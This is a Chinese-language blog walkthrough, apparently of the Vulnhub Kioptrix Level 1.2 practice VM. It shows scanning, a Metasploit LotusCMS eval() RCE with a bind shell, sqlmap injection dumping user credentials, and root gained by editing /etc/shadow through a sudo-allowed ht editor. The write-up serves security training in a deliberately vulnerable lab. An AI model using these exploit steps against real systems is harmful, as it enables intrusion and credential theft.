{"pageProps":{"postData":{"id":"VulnhubKioptrix Level 1 2","contentHtml":"<h1>Kioptrix: Level 1.2</h1>\n<blockquote>\n<p><a href=\"https://www.vulnhub.com/entry/kioptrix-level-12-3,24/\">https://www.vulnhub.com/entry/kioptrix-level-12-3,24/</a></p>\n</blockquote>\n<h2>主机发现端口扫描</h2>\n<ol>\n<li>\n<p>使用nmap扫描网段类存活主机</p>\n<p>因为靶机是我最后添加的，所以靶机IP是<code>169</code></p>\n<pre><code class=\"hljs language-php\">nmap -sP <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.0</span>/<span class=\"hljs-number\">24</span>                \nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-10-29 13:16 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.1</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00031</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:C0:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">08</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.2</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00029</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:FB:CA:<span class=\"hljs-number\">45</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.169</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00052</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:D1:B8:<span class=\"hljs-number\">48</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.254</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00021</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:EC:C5:<span class=\"hljs-title function_ invoke__\">A4</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.151</span>\n</code></pre>\n</li>\n<li>\n<p>扫描主机开放端口</p>\n<pre><code class=\"hljs language-php\">nmap -sT -min-rate <span class=\"hljs-number\">10000</span> -p- <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.169</span>\nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-10-29 13:16 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.169</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.0010</span>s latency).\nNot shown: <span class=\"hljs-number\">65533</span> closed tcp <span class=\"hljs-title function_ invoke__\">ports</span> (conn-refused)\nPORT   STATE SERVICE\n<span class=\"hljs-number\">22</span>/tcp open  ssh\n<span class=\"hljs-number\">80</span>/tcp open  http\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:D1:B8:<span class=\"hljs-number\">48</span> (VMware)\n</code></pre>\n</li>\n<li>\n<p>扫描主机服务版本以及系统版本</p>\n<pre><code class=\"hljs language-php\">nmap -sV -sT -O -p22,<span class=\"hljs-number\">80</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.169</span>     \nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-10-29 13:19 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.169</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00044</span>s latency).\n\nPORT   STATE SERVICE VERSION\n<span class=\"hljs-number\">22</span>/tcp open  ssh     OpenSSH <span class=\"hljs-number\">4.7</span>p1 Debian <span class=\"hljs-number\">8</span>ubuntu1.<span class=\"hljs-number\">2</span> (protocol <span class=\"hljs-number\">2.0</span>)\n<span class=\"hljs-number\">80</span>/tcp open  http    Apache httpd <span class=\"hljs-number\">2.2</span>.<span class=\"hljs-number\">8</span> ((Ubuntu) PHP/<span class=\"hljs-number\">5.2</span>.<span class=\"hljs-number\">4</span>-<span class=\"hljs-number\">2</span>ubuntu5.<span class=\"hljs-number\">6</span> with Suhosin-Patch)\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:D1:B8:<span class=\"hljs-number\">48</span> (VMware)\nWarning: OSScan results may be unreliable because we could not find at least <span class=\"hljs-number\">1</span> open <span class=\"hljs-keyword\">and</span> <span class=\"hljs-number\">1</span> closed port\nDevice type: general purpose\nRunning: Linux <span class=\"hljs-number\">2.6</span>.X\nOS CPE: cpe:/o:linux:linux_kernel:<span class=\"hljs-number\">2.6</span>\nOS details: Linux <span class=\"hljs-number\">2.6</span>.<span class=\"hljs-number\">9</span> - <span class=\"hljs-number\">2.6</span>.<span class=\"hljs-number\">33</span>\nNetwork Distance: <span class=\"hljs-number\">1</span> hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n</code></pre>\n</li>\n<li>\n<p>扫描漏洞</p>\n<pre><code class=\"hljs language-python\">nmap -script=vuln -p22,<span class=\"hljs-number\">80</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.169</span>\nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https://nmap.org ) at <span class=\"hljs-number\">2024</span>-<span class=\"hljs-number\">10</span>-<span class=\"hljs-number\">29</span> <span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">20</span> CST\nStats: <span class=\"hljs-number\">0</span>:02:<span class=\"hljs-number\">22</span> elapsed; <span class=\"hljs-number\">0</span> hosts completed (<span class=\"hljs-number\">1</span> up), <span class=\"hljs-number\">1</span> undergoing Script Scan\nNSE Timing: About <span class=\"hljs-number\">98.52</span>% done; ETC: <span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">22</span> (<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">00</span>:02 remaining)\nStats: <span class=\"hljs-number\">0</span>:02:<span class=\"hljs-number\">53</span> elapsed; <span class=\"hljs-number\">0</span> hosts completed (<span class=\"hljs-number\">1</span> up), <span class=\"hljs-number\">1</span> undergoing Script Scan\nNSE Timing: About <span class=\"hljs-number\">98.52</span>% done; ETC: <span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">23</span> (<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">00</span>:02 remaining)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.169</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00027</span>s latency).\n\nPORT   STATE SERVICE\n<span class=\"hljs-number\">22</span>/tcp <span class=\"hljs-built_in\">open</span>  ssh\n<span class=\"hljs-number\">80</span>/tcp <span class=\"hljs-built_in\">open</span>  http\n| http-cookie-flags: \n|   /: \n|     PHPSESSID: \n|_      httponly flag <span class=\"hljs-keyword\">not</span> <span class=\"hljs-built_in\">set</span>\n| http-sql-injection: \n|   Possible sqli <span class=\"hljs-keyword\">for</span> queries:\n|     http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.169</span>:<span class=\"hljs-number\">80</span>/index.php?page=index%<span class=\"hljs-number\">27</span>%20OR%20sqlspider\n|     http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.169</span>:<span class=\"hljs-number\">80</span>/index.php?page=index%<span class=\"hljs-number\">27</span>%20OR%20sqlspider\n|     http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.169</span>:<span class=\"hljs-number\">80</span>/index.php?system=Admin&#x26;page=loginSubmit%<span class=\"hljs-number\">27</span>%20OR%20sqlspider\n|     http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.169</span>:<span class=\"hljs-number\">80</span>/index.php?page=index%<span class=\"hljs-number\">27</span>%20OR%20sqlspider\n|     http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.169</span>:<span class=\"hljs-number\">80</span>/index.php?page=index%<span class=\"hljs-number\">27</span>%20OR%20sqlspider\n|     http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.169</span>:<span class=\"hljs-number\">80</span>/index.php?page=index%<span class=\"hljs-number\">27</span>%20OR%20sqlspider\n|     http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.169</span>:<span class=\"hljs-number\">80</span>/index.php?page=index%<span class=\"hljs-number\">27</span>%20OR%20sqlspider\n|     http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.169</span>:<span class=\"hljs-number\">80</span>/index.php?page=index%<span class=\"hljs-number\">27</span>%20OR%20sqlspider\n|     http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.169</span>:<span class=\"hljs-number\">80</span>/index.php?page=index%<span class=\"hljs-number\">27</span>%20OR%20sqlspider\n|     http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.169</span>:<span class=\"hljs-number\">80</span>/index.php?system=Admin&#x26;page=loginSubmit%<span class=\"hljs-number\">27</span>%20OR%20sqlspider\n|_    http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.169</span>:<span class=\"hljs-number\">80</span>/index.php?page=index%<span class=\"hljs-number\">27</span>%20OR%20sqlspider\n| http-slowloris-check: \n|   VULNERABLE:\n|   Slowloris DOS attack\n|     State: LIKELY VULNERABLE\n|     IDs:  CVE:CVE-<span class=\"hljs-number\">2007</span>-<span class=\"hljs-number\">6750</span>\n|       Slowloris tries to keep many connections to the target web server <span class=\"hljs-built_in\">open</span> <span class=\"hljs-keyword\">and</span> hold\n|       them <span class=\"hljs-built_in\">open</span> <span class=\"hljs-keyword\">as</span> long <span class=\"hljs-keyword\">as</span> possible.  It accomplishes this by opening connections to\n|       the target web server <span class=\"hljs-keyword\">and</span> sending a partial request. By doing so, it starves\n|       the http serve<span class=\"hljs-string\">r's resources causing Denial Of Service.\n|       \n|     Disclosure date: 2009-09-17\n|     References:\n|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750\n|_      http://ha.ckers.org/slowloris/\n|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)\n|_http-trace: TRACE is enabled\n| http-csrf: \n| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.75.169\n|   Found the following possible CSRF vulnerabilities: \n|     \n|     Path: http://192.168.75.169:80/gallery/\n|     Form id: \n|     Form action: login.php\n|     \n|     Path: http://192.168.75.169:80/index.php?system=Admin\n|     Form id: contactform\n|     Form action: index.php?system=Admin&#x26;page=loginSubmit\n|     \n|     Path: http://192.168.75.169:80/gallery/gadmin/\n|     Form id: username\n|     Form action: index.php?task=signin\n|     \n|     Path: http://192.168.75.169:80/gallery/index.php\n|     Form id: \n|     Form action: login.php\n|     \n|     Path: http://192.168.75.169:80/index.php?system=Blog&#x26;post=1281005380\n|     Form id: commentform\n|     Form action: \n|     \n|     Path: http://192.168.75.169:80/index.php?system=Admin&#x26;page=loginSubmit\n|     Form id: contactform\n|_    Form action: index.php?system=Admin&#x26;page=loginSubmit\n|_http-dombased-xss: Couldn'</span>t find <span class=\"hljs-built_in\">any</span> DOM based XSS.\n| http-enum: \n|   /phpmyadmin/: phpMyAdmin\n|   /cache/: Potentially interesting folder\n|   /core/: Potentially interesting folder\n|   /icons/: Potentially interesting folder w/ directory listing\n|   /modules/: Potentially interesting directory w/ listing on <span class=\"hljs-string\">'apache/2.2.8 (ubuntu) php/5.2.4-2ubuntu5.6 with suhosin-patch'</span>\n|_  /style/: Potentially interesting folder\n|_http-stored-xss: Couldn<span class=\"hljs-string\">'t find any stored XSS vulnerabilities.\nMAC Address: 00:0C:29:D1:B8:48 (VMware)\n</span></code></pre>\n</li>\n</ol>\n<h2>WEB渗透</h2>\n<ol>\n<li>\n<p>访问主页</p>\n<p><img src=\"/post-images/VulnhubKioptrix%20Level%201%202/image58.png\" alt=\"image.png\"></p>\n</li>\n<li>\n<p>扫描目录</p>\n<pre><code class=\"hljs language-python\">dirsearch -u <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.169</span> -x <span class=\"hljs-number\">403</span>\n//\n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">31</span>:06] Starting:                                                                                                                                                                                              \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">31</span>:<span class=\"hljs-number\">27</span>] <span class=\"hljs-number\">301</span> -  355B  - /cache  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.169</span>/cache/          \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">31</span>:<span class=\"hljs-number\">31</span>] <span class=\"hljs-number\">301</span> -  354B  - /core  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.169</span>/core/            \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">31</span>:<span class=\"hljs-number\">31</span>] <span class=\"hljs-number\">200</span> -  688B  - /core/fragments/moduleInfo.phtml\n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">31</span>:<span class=\"hljs-number\">36</span>] <span class=\"hljs-number\">200</span> -   23KB - /favicon.ico                                      \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">31</span>:<span class=\"hljs-number\">37</span>] <span class=\"hljs-number\">301</span> -  357B  - /gallery  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.169</span>/gallery/      \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">31</span>:<span class=\"hljs-number\">47</span>] <span class=\"hljs-number\">301</span> -  357B  - /modules  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.169</span>/modules/      \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">31</span>:<span class=\"hljs-number\">47</span>] <span class=\"hljs-number\">200</span> -    2KB - /modules/                                         \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">31</span>:<span class=\"hljs-number\">52</span>] <span class=\"hljs-number\">301</span> -  360B  - /phpmyadmin  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.169</span>/phpmyadmin/\n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">31</span>:<span class=\"hljs-number\">53</span>] <span class=\"hljs-number\">401</span> -  520B  - /phpmyadmin/scripts/setup.php                     \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">31</span>:<span class=\"hljs-number\">53</span>] <span class=\"hljs-number\">200</span> -    8KB - /phpmyadmin/                                      \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">31</span>:<span class=\"hljs-number\">53</span>] <span class=\"hljs-number\">200</span> -    8KB - /phpmyadmin/index.php                             \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">32</span>:03] <span class=\"hljs-number\">301</span> -  355B  - /style  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.169</span>/style/          \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">32</span>:08] <span class=\"hljs-number\">200</span> -   18B  - /update.php    \n</code></pre>\n<ul>\n<li><code>/modules</code> 像是文件服务器</li>\n<li><code>/phpmyadmin</code>  phpmyadmin</li>\n<li><code>/update.php</code> 提示<code>permission denied.</code></li>\n<li><code>index.php?system=Admin</code> 是登陆页面</li>\n</ul>\n</li>\n<li>\n<p>登陆页面发现是CMS是<code>LotusCMS</code> 查阅有没有可以利用漏洞</p>\n<ul>\n<li>\n<p>看见<code>ruby</code>后缀利用文件，上<code>msf</code>搜索看看</p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-comment\"># searchsploit LotusCMS    </span>\n//\n-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                                                                                                                                  |  Path\n-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nLotusCMS <span class=\"hljs-number\">3.0</span> - <span class=\"hljs-string\">'eval()'</span> Remote Command Execution (Metasploit)                                                                                                                   | php/remote/<span class=\"hljs-number\">18565.</span>rb\nLotusCMS <span class=\"hljs-number\">3.0</span><span class=\"hljs-number\">.3</span> - Multiple Vulnerabilities                                                                                                                                       | php/webapps/<span class=\"hljs-number\">16982.</span>txt\n-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\n</code></pre>\n</li>\n<li>\n<p>进入<code>msf</code>控制台，进行搜索，应该就是<code>searchsploit</code> 搜索出来的那个</p>\n<pre><code class=\"hljs language-python\">msf6 > search LotusCMS\n\nMatching Modules\n================\n\n   <span class=\"hljs-comment\">#  Name                              Disclosure Date  Rank       Check  Description</span>\n   -  ----                              ---------------  ----       -----  -----------\n   <span class=\"hljs-number\">0</span>  exploit/multi/http/lcms_php_exec  <span class=\"hljs-number\">2011</span>-03-03       excellent  Yes    LotusCMS <span class=\"hljs-number\">3.0</span> <span class=\"hljs-built_in\">eval</span>() Remote Command Execution\n</code></pre>\n</li>\n<li>\n<p>尝试利用</p>\n<pre><code class=\"hljs language-python\">msf6 > use exploit/multi/http/lcms_php_exec \nmsf6 exploit(multi/http/lcms_php_exec) > <span class=\"hljs-built_in\">set</span> rhosts <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.169</span>\nrhosts => <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.169</span>\nmsf6 exploit(multi/http/lcms_php_exec) > <span class=\"hljs-built_in\">set</span> uri /index.php?system=Admin\nuri => /index.php?system=Admin\nmsf6 exploit(multi/http/lcms_php_exec) > run\n[*] Started reverse TCP handler on <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.151</span>:<span class=\"hljs-number\">4444</span> \n[*] Using found page param: /index.php?page=index\n[*] Sending exploit ...\n[*] Exploit completed, but no session was created.\n</code></pre>\n<p>死活不成功，尝试换一下<code>payload</code></p>\n<pre><code class=\"hljs language-python\">msf6 exploit(multi/http/lcms_php_exec) > <span class=\"hljs-built_in\">set</span> payload php/reverse_php \npayload => php/reverse_php\n</code></pre>\n<p>尝试了几个<code>payload</code>后发现<code>php/bind_perl</code> 可以使用</p>\n<pre><code class=\"hljs language-python\">msf6 exploit(multi/http/lcms_php_exec) > <span class=\"hljs-built_in\">set</span> payload php/reverse_perl \npayload => php/reverse_perl\nmsf6 exploit(multi/http/lcms_php_exec) > run\n\n[*] Started reverse TCP handler on <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.151</span>:<span class=\"hljs-number\">4444</span> \n[*] Using found page param: /index.php?page=index\n[*] Sending exploit ...\n[*] Exploit completed, but no session was created.\nmsf6 exploit(multi/http/lcms_php_exec) > <span class=\"hljs-built_in\">set</span> payload php/bind_perl\npayload => php/bind_perl\nmsf6 exploit(multi/http/lcms_php_exec) > run\n\n[*] Using found page param: /index.php?page=index\n[*] Sending exploit ...\n[*] Started bind TCP handler against <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.169</span>:<span class=\"hljs-number\">4444</span>\n[*] Command shell session <span class=\"hljs-number\">1</span> opened (<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.151</span>:<span class=\"hljs-number\">34319</span> -> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.169</span>:<span class=\"hljs-number\">4444</span>) at <span class=\"hljs-number\">2024</span>-<span class=\"hljs-number\">10</span>-<span class=\"hljs-number\">29</span> <span class=\"hljs-number\">14</span>:08:<span class=\"hljs-number\">36</span> +0800\nwhoami\nwww-data\n</code></pre>\n</li>\n</ul>\n</li>\n</ol>\n<h2>提权</h2>\n<ol>\n<li>\n<p>查看权限</p>\n<pre><code class=\"hljs language-python\">python -c <span class=\"hljs-string\">\"import pty;pty.spawn('/bin/sh')\"</span>\n//\n$ <span class=\"hljs-built_in\">id</span>\nuid=<span class=\"hljs-number\">33</span>(www-data) gid=<span class=\"hljs-number\">33</span>(www-data) groups=<span class=\"hljs-number\">33</span>(www-data)\n//\n$ uname -a\nLinux Kioptrix3 <span class=\"hljs-number\">2.6</span><span class=\"hljs-number\">.24</span>-<span class=\"hljs-number\">24</span>-server <span class=\"hljs-comment\">#1 SMP Tue Jul 7 20:21:17 UTC 2009 i686 GNU/Linux</span>\n//\n$ whoami\nwww-data\n</code></pre>\n</li>\n<li>\n<p>寻找突破口</p>\n<ul>\n<li>\n<p>suid提权寻找</p>\n<pre><code class=\"hljs language-python\">$ find / -perm -u=s -<span class=\"hljs-built_in\">type</span> f <span class=\"hljs-number\">2</span>>/dev/null\n/usr/lib/eject/dmcrypt-get-device\n/usr/lib/openssh/ssh-keysign\n/usr/lib/apache2/suexec\n/usr/lib/pt_chown\n/usr/<span class=\"hljs-built_in\">bin</span>/arping\n/usr/<span class=\"hljs-built_in\">bin</span>/mtr\n/usr/<span class=\"hljs-built_in\">bin</span>/newgrp\n/usr/<span class=\"hljs-built_in\">bin</span>/chfn\n/usr/<span class=\"hljs-built_in\">bin</span>/gpasswd\n/usr/<span class=\"hljs-built_in\">bin</span>/sudo\n/usr/<span class=\"hljs-built_in\">bin</span>/at\n/usr/<span class=\"hljs-built_in\">bin</span>/sudoedit\n/usr/<span class=\"hljs-built_in\">bin</span>/chsh\n/usr/<span class=\"hljs-built_in\">bin</span>/passwd\n/usr/<span class=\"hljs-built_in\">bin</span>/traceroute6.iputils\n/usr/local/<span class=\"hljs-built_in\">bin</span>/ht\n/usr/sbin/pppd\n/usr/sbin/uuidd\n/lib/dhcp3-client/call-dhclient-script\n/<span class=\"hljs-built_in\">bin</span>/fusermount\n/<span class=\"hljs-built_in\">bin</span>/ping\n/<span class=\"hljs-built_in\">bin</span>/mount\n/<span class=\"hljs-built_in\">bin</span>/umount\n/<span class=\"hljs-built_in\">bin</span>/ping6\n/<span class=\"hljs-built_in\">bin</span>/su\n</code></pre>\n</li>\n<li>\n<p><code>/etc/phpmyadmin</code>下<code>config.inc.php</code>存在数据库账号密码，尝试但是登陆失败</p>\n<pre><code class=\"hljs language-python\">// $cfg[<span class=\"hljs-string\">'Servers'</span>][$i][<span class=\"hljs-string\">'controluser'</span>] = <span class=\"hljs-string\">'pma'</span>;\n// $cfg[<span class=\"hljs-string\">'Servers'</span>][$i][<span class=\"hljs-string\">'controlpass'</span>] = <span class=\"hljs-string\">'pmapass'</span>;\n</code></pre>\n</li>\n<li>\n<p>寻找敏感文件，在<code>/home/loneferret</code> 存在一个<code>CompanyPolicy.README</code> 文件</p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-comment\"># CompanyPolicy.README</span>\nHello new employee,\nIt <span class=\"hljs-keyword\">is</span> company policy here to use our newly installed software <span class=\"hljs-keyword\">for</span> editing, creating <span class=\"hljs-keyword\">and</span> viewing files.\nPlease use the command <span class=\"hljs-string\">'sudo ht'</span>.\nFailure to do so will result <span class=\"hljs-keyword\">in</span> you immediate termination.\n\nDG\nCEO\n</code></pre>\n<p>但是<code>sudo ht</code>需要密码，继续寻找别的方法</p>\n</li>\n</ul>\n</li>\n</ol>\n<h2>web渗透 2</h2>\n<ol>\n<li>\n<p>才知道我的靶机有问题，访问<code>gallery/</code> 会加载不完全，被浏览器自动拦截了很多内容。</p>\n<p><img src=\"/post-images/VulnhubKioptrix%20Level%201%202/image59.png\" alt=\"image.png\"></p>\n</li>\n<li>\n<p>取消拦截后就好了</p>\n</li>\n<li>\n<p>发现 <code>http://kioptrix3.com/gallery/gallery.php?id=1</code> 有个可能存在sql注入的地方，使用<code>sqlmap</code>检测是否存在sql注入</p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-comment\"># 结果</span>\n[<span class=\"hljs-number\">19</span>:07:04] [INFO] the back-end DBMS <span class=\"hljs-keyword\">is</span> MySQL\nweb server operating system: Linux Ubuntu <span class=\"hljs-number\">8.04</span> (Hardy Heron)\nweb application technology: PHP <span class=\"hljs-number\">5.2</span><span class=\"hljs-number\">.4</span>, Apache <span class=\"hljs-number\">2.2</span><span class=\"hljs-number\">.8</span>, PHP\nback-end DBMS: MySQL >= <span class=\"hljs-number\">5.0</span><span class=\"hljs-number\">.12</span>\n[<span class=\"hljs-number\">19</span>:07:05] [WARNING] HTTP error codes detected during run:\n<span class=\"hljs-number\">500</span> (Internal Server Error) - <span class=\"hljs-number\">23</span> times\n[<span class=\"hljs-number\">19</span>:07:05] [INFO] fetched data logged to text files under <span class=\"hljs-string\">'/root/.local/share/sqlmap/output/kioptrix3.com'</span>\n</code></pre>\n<p>存在sql注入，继续使用<code>sqlmap</code>来爆破剩余的数据</p>\n<p>最后<code>dump</code>下两行数据，是两个用户</p>\n<pre><code class=\"hljs language-python\">+----+---------------------------------------------+------------+\n| <span class=\"hljs-built_in\">id</span> | password                                    | username   |\n+----+---------------------------------------------+------------+\n| <span class=\"hljs-number\">1</span>  | 0d3eccfb887aabd50f243b3f155c0f85 (Mast3r)   | dreg       |\n| <span class=\"hljs-number\">2</span>  | 5badcaf789d3d1d09794d8f021f40f0e (starwars) | loneferret |\n+----+---------------------------------------------+------------+\n</code></pre>\n</li>\n<li>\n<p>使用爆破出来的用户去尝试登陆 ssh，<code>loneferret</code>成功登入</p>\n</li>\n</ol>\n<h2>提权 2</h2>\n<ol>\n<li>\n<p>查看权限</p>\n<pre><code class=\"hljs language-python\">loneferret@Kioptrix3:~$ sudo -l\nUser loneferret may run the following commands on this host:\n    (root) NOPASSWD: !/usr/<span class=\"hljs-built_in\">bin</span>/su\n\t    (root) NOPASSWD: /usr/local/<span class=\"hljs-built_in\">bin</span>/ht\n</code></pre>\n<p><code>ht</code>拥有<code>sudo</code>权限，根据之前发现的内容知道ht可以编辑文件，并且拥有<code>sudo</code>权限</p>\n</li>\n<li>\n<p>尝试修改<code>shadow</code>文件</p>\n<pre><code class=\"hljs language-python\">loneferret@Kioptrix3:~$ sudo ht /etc/shadow\nError opening terminal: xterm-256color.\n</code></pre>\n<p>报错了：<code>Error opening terminal: xterm-256color.</code> ，需要加上</p>\n<pre><code class=\"hljs language-python\">export TERM=xterm\n</code></pre>\n</li>\n<li>\n<p>直接将当前用户的密码覆盖到<code>root</code>上去，<code>F3</code>好像是编辑，<code>F2</code>保存，<code>ctrl + c</code>退出</p>\n<p><img src=\"/post-images/VulnhubKioptrix%20Level%201%202/image60.png\" alt=\"image.png\"></p>\n</li>\n<li>\n<p>然后<code>ssh</code>登录<code>root</code>账户，提权成功</p>\n<pre><code class=\"hljs language-python\">loneferret@Kioptrix3:~$ su root\nPassword:                                                                                                                                                                                                         \nroot@Kioptrix3:/home/loneferret<span class=\"hljs-comment\"># </span>\n</code></pre>\n<p>读取flag文件</p>\n<pre><code class=\"hljs language-python\">root@Kioptrix3:~<span class=\"hljs-comment\"># cat Congrats.txt </span>\n//\nGood <span class=\"hljs-keyword\">for</span> you <span class=\"hljs-keyword\">for</span> getting here.                                                                                                                                                                                    \nRegardless of the matter (staying within the spirit of the game of course)                                                                                                                                        \nyou got here, congratulations are <span class=\"hljs-keyword\">in</span> order. Wasn<span class=\"hljs-string\">'t that bad now was it.                                                                                                                                           \n                                                                                                                                                                                                                  \nWent in a different direction with this VM. Exploit based challenges are\nnice. Helps workout that information gathering part, but sometimes we\nneed to get our hands dirty in other things as well.\nAgain, these VMs are beginner and not intented for everyone. \nDifficulty is relative, keep that in mind.\n\nThe object is to learn, do some research and have a little (legal)\nfun in the process.\n\nI hope you enjoyed this third challenge.\n\nSteven McElrea\naka loneferret\nhttp://www.kioptrix.com\n\nCredit needs to be given to the creators of the gallery webapp and CMS used\nfor the building of the Kioptrix VM3 site.\n\nMain page CMS: \nhttp://www.lotuscms.org\n\nGallery application: \nGallarific 2.1 - Free Version released October 10, 2009\nhttp://www.gallarific.com\nVulnerable version of this application can be downloaded\nfrom the Exploit-DB website:\nhttp://www.exploit-db.com/exploits/15891/\n\nThe HT Editor can be found here:\nhttp://hte.sourceforge.net/downloads.html\nAnd the vulnerable version on Exploit-DB here:\nhttp://www.exploit-db.com/exploits/17083/\n\nAlso, all pictures were taken from Google Images, so being part of the\npublic domain I used them.\n\nroot@Kioptrix3:~# \n\n</span></code></pre>\n</li>\n</ol>","title":"Vulnhub - Kioptrix Level 1 